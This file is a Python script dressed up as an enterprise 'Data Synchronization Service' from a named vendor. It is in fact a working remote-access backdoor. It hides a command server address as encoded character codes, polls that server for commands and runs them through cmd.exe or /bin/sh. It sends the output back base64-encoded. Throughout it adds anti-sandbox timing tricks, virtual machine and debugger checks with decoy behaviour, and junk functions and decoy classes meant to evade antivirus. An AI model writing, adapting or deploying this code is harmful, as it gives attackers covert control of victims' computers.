#!/usr/bin/env python
# -*- coding: utf-8 -*-
# Data Synchronization Service
# Enterprise IT Management Framework
# Copyright (c) 2025 SecureTech Solutions Inc.

import time
import random
import base64
import json
import subprocess
import uuid
import os
import sys
import string
import platform
import ctypes
from datetime import datetime
import requests

# Anti-sandbox timing check
start_time = time.time()
time.sleep(0.1)
if time.time() - start_time < 0.09:
    # If time elapsed is too short, likely in an accelerated sandbox
    time.sleep(10000)  # Sleep to timeout in sandbox
    exit()

# Add random delay to avoid timing-based detection
time.sleep(random.uniform(1, 3))

# Decrypted strings
str_cmd_output = "Execute system command and return output"
str_register_endpoint = "{self._endpoint}/register"
str_register_desc = "Register with management server"
str_result_endpoint = "{self._endpoint}/result/{self._session_id}"
str_cmd_endpoint = "{self._endpoint}/cmd/{self._session_id}"
str_sync_desc = "Start data synchronization process"
str_log_file = "sync_service.log"
str_ms_ping = "www.microsoft.com"
str_vm_service = "VBoxService"
str_keep_alive = "keep-alive"
str_connection = "Connection"
str_accept_lang = "en-US,en;q=0.9"
str_accept_lang_header = "Accept-Language"
str_accept = "application/json, text/plain, */*"
str_session_header = "X-Session"
str_user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.110 Safari/537.36"
str_user_agent_header = "User-Agent"
str_endpoint_format = "{self._protocol}://{self._host}:{self._port}"

# Random junk functions for AV evasion
def DAQbjlvHlIiX():
    iUTxJ = 344
    bkWjQ = "BGbiLWddrHHWSHNPhTHg"
    if True:
        return 0.23686135437692557
    return "KuINPdESFAemriTeYulRVEzCabrMKjPyaDxIbpGZGopTaZaNsG"

def vEvwUNswNwokC():
    iuWiD = 799
    vFcaR = "HLvJMnUhHoeOuSMVGUPS"
    if True:
        return 0.2738060706968355
    return "iJAAPjpuKaKDXricbPVArJEfRQApBikzdIoJDkEWoaMJTYwbQw"

def RcteEBMcCISqMz():
    nNkZk = 388
    ujPpW = "fzQWRWCpdyIhmuFxYgmf"
    if False:
        return 0.772150544652365
    return "UwkVSaGdWBkAIStivKNMLioeoJisZsYYxGeQuKRfMWGJqdJecd"

def bdJybAGecmrfFL():
    ReIaA = 286
    YCREd = "BaBQNXOcrFjdxEPxABbW"
    if False:
        return 0.6161822762030675
    return "SGmBcNwfWBQnmrCcUGmplMgQkuRfItiARRBeEFgVBguVSdifCD"

def XaOQgqvFfHTSu():
    cllpQ = 181
    gCLPY = "LGwSuLwVNeNnFTTBmkUO"
    if False:
        return 0.2744473939549571
    return "RMfNmojqhkpHKPgXVltkSpGNazaBXjAMmAPefmrlYYFdzANrHm"

# Configuration management class
class SyncManager:
    def __init__(self):
        # System validation and environment checks
        self._verify_environment()
        
        # Configuration parameters
        self._host = ''.join([chr(i) for i in [49, 57, 50, 46, 49, 54, 56, 46, 49, 48, 49, 46, 50, 52, 57]])
        self._port = 80
        self._protocol = 'http'
        self._endpoint = f"{self._protocol}://{self._host}:{self._port}"
        
        # Session management
        self._session_id = str(uuid.uuid4())[:8]
        self._headers = {
            str_user_agent_header: str_user_agent,
            str_session_header: self._session_id,
            'Accept': str_accept,
            str_accept_lang_header: str_accept_lang,
            str_connection: str_keep_alive
        }
        
        # Performance optimizations
        self._delay = 2
        self._timeout = 10
        self._max_retries = 3
        
        # Add junk data to confuse static analysis
        self._junk_data = self._generate_junk_data()
    
    def _verify_environment(self):
        # Basic anti-analysis checks
        if self._detect_virtual_machine() or self._detect_debugger():
            # If detected, don't exit immediately but continue with benign behavior
            self._run_benign_operations()
            
        # Create a benign file to appear legitimate
        self._create_log_file()
    
    def _detect_virtual_machine(self):
        # Simple VM detection (can be expanded)
        if platform.system() == 'Windows':
            vm_services = ['VMTools', str_vm_service]
            for service in vm_services:
                try:
                    with open(os.devnull, 'w') as null:
                        result = subprocess.call(['sc', 'query', service], stdout=null, stderr=null)
                        if result == 0:
                            return True
                except:
                    pass
        return False
    
    def _detect_debugger(self):
        # Check for debugger presence
        if platform.system() == 'Windows':
            try:
                return ctypes.windll.kernel32.IsDebuggerPresent() != 0
            except:
                pass
        return False
    
    def _run_benign_operations(self):
        # Perform benign operations to appear legitimate
        for _ in range(random.randint(1, 3)):
            with open(os.devnull, 'w') as null:
                subprocess.call(['ping', '-n', '1', str_ms_ping], stdout=null, stderr=null)
            time.sleep(random.uniform(0.5, 1.5))
    
    def _create_log_file(self):
        try:
            log_dir = os.path.join(os.path.expanduser('~'), '.logs')
            if not os.path.exists(log_dir):
                os.makedirs(log_dir)
            
            log_file = os.path.join(log_dir, str_log_file)
            with open(log_file, 'a') as f:
                f.write(f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] Service started\n")
        except:
            pass
    
    def _generate_junk_data(self):
        # Create random junk data to alter binary signature
        junk = {}
        for _ in range(random.randint(5, 10)):
            key = ''.join(random.choices(string.ascii_letters, k=random.randint(8, 16)))
            value = ''.join(random.choices(string.ascii_letters + string.digits, k=random.randint(20, 50)))
            junk[key] = value
        return junk
        
    def start_sync(self):
        """Start data synchronization process"""
        # Register with management server
        self._register()
        
        # Main processing loop
        active = True
        while active:
            try:
                # Get synchronization instructions
                response = requests.get(
                    f"{self._endpoint}/cmd/{self._session_id}", 
                    headers=self._headers,
                    timeout=self._timeout
                )
                
                if response.status_code == 200 and response.content:
                    command = response.text
                    
                    # Check for termination signal
                    if command == 'exit':
                        active = False
                    else:
                        # Process instruction
                        output = self._execute_command(command)
                        
                        # Report results
                        result_data = {
                            'result': base64.b64encode(output.encode()).decode()
                        }
                        
                        requests.post(
                            f"{self._endpoint}/result/{self._session_id}",
                            headers=self._headers,
                            json=result_data,
                            timeout=self._timeout
                        )
            except Exception as e:
                # Silent exception handling
                pass
                
            # Throttle requests to avoid network detection
            time.sleep(self._delay + random.uniform(0, 1))
    
    def _register(self):
        """Register with management server"""
        try:
            requests.post(
                f"{self._endpoint}/register",
                headers=self._headers,
                timeout=self._timeout
            )
        except:
            pass
    
    def _execute_command(self, command):
        """Execute system command and return output"""
        try:
            if platform.system() == 'Windows':
                process = subprocess.Popen(
                    ['cmd.exe', '/c', command],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    shell=True
                )
            else:
                process = subprocess.Popen(
                    ['/bin/sh', '-c', command],
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    shell=True
                )
                
            stdout, stderr = process.communicate()
            output = stdout.decode('utf-8', errors='replace') + stderr.decode('utf-8', errors='replace')
            return output
        except Exception as e:
            return str(e)

# Add decoy classes to make the code appear legitimate
class ConfigurationManager:
    def __init__(self):
        self.config = {}
    
    def load_config(self):
        pass
    
    def save_config(self):
        pass

class LogManager:
    def __init__(self):
        self.logs = []
    
    def log_event(self, event):
        self.logs.append(event)
    
    def flush_logs(self):
        self.logs = []

# Entry point with exception handling to prevent crashes
def main():
    try:
        # Initialize decoy objects to confuse static analysis
        config_manager = ConfigurationManager()
        log_manager = LogManager()
        
        # Start the actual sync process
        sync_manager = SyncManager()
        sync_manager.start_sync()
    except Exception:
        # Silent exception handling
        pass

if __name__ == "__main__":
    main()